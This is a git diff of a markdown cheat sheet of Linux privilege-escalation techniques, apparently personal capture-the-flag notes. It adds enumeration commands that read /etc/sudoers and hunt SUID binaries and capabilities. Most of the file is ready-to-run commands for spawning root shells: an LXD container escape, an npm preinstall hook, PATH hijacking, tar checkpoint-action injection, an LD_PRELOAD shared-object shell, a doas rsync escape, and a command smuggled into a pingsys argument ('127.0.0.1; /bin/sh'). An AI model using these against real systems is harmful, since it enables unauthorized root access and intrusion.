@@ -1,4 +1,37 @@
-#### LXD container exploitation
+# information gathering
+
+```bash
+cat /proc/version
+cat /etc/issue
+cat /etc/sudoers
+ps aux | grep cron
+ps
+env
+ip route
+uname -a
+netstat # -at -l -t -tp -i
+netstat -tupln | grep LISTEN
+ss -atur
+find / -writable 2>/dev/null
+find / -mtime 10 #find files that were modified in the last 10 days
+find . -name flag.txt
+find / -type d -name config #find the directory named config under “/”
+find / -type f -user <user> 2>/dev/null #find files owned by user
+find / -type f -perm /4000 2>/dev/null
+find / -type f -group <group> -exec ls -l {} + 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/exports #file sharing
+nmap --script=vuln <ip>
+cat /proc/1/cgroup #if u in docker
+cat /etc/exports
+```
+## quik one-line bash script with colorful output to enumerate linux machine
+
+```bash
+for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/version" "cat /etc/issue" "cat /etc/sudoers" "cat /etc/sudoers.d" "env" "ip route" "uname -a" "netstat -tupln | grep LISTEN" "find / -type f -perm /4000 2>/dev/null" "getcap -r / 2>/dev/null" "cat /etc/exports" "cat /proc/1/cgroup"; do echo  "\n\033[1;34mCommand: $cmd\033[0m"; echo "\033[1;32m$(eval $cmd)\033[0m"; echo  "\033[1;33m\n===================================================================================================\n==================================================================================================="; done
+```
+---
+# LXD container exploitation
 
 ```bash
 wget archive
@@ -24,14 +57,14 @@ Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
 ubuntu@ajkavanagh-bionic-test:~$ lxc storage list
 ```
 ---
-#### with doas
+# with doas
 
 ```bash
 doas -u root openssl enc -in file
 doas -u root /bin/bash
 ```
 ---
-#### with npm -u
+# with npm -u
 
 ```bash
 mkdir ~/tmp
@@ -39,7 +72,7 @@ echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
 sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
 ```
 ---
-#### PATH
+# PATH
 
 ```bash
 echo /bin/sh > curl
@@ -49,7 +82,7 @@ export PATH=/tmp:$PATH
 ```
 
 ---
-#### tar
+# tar
 
 ```bash
 cat > /home/andre/backup/rev << EOF
@@ -63,7 +96,7 @@ echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
 chmod +x rev
 ```
 ---
-#### env_keep += LD_PRELOAD
+# env_keep += LD_PRELOAD
 
 ```bash
 cd /tmp
@@ -82,12 +115,17 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
 ```
 ---
-#### doas
+# doas
 ```
 doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 ```
 ---
-#### links
+# pingsys
+```
+/usr/bin/pingsys '127.0.0.1; /bin/sh'
+```
+---
+# links
 * [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 * [linEnum](https://github.com/rebootuser/LinEnum)
 * [LES](https://github.com/mzet-/linux-exploit-suggester)
@@ -97,8 +135,3 @@ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 * [GTFOBins (unix)](https://gtfobins.github.io/)
 * [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 * [linux backdoors](./linux_backdoors.md)
----
-#### pingsys
-```
-/usr/bin/pingsys '127.0.0.1; /bin/sh'
-```
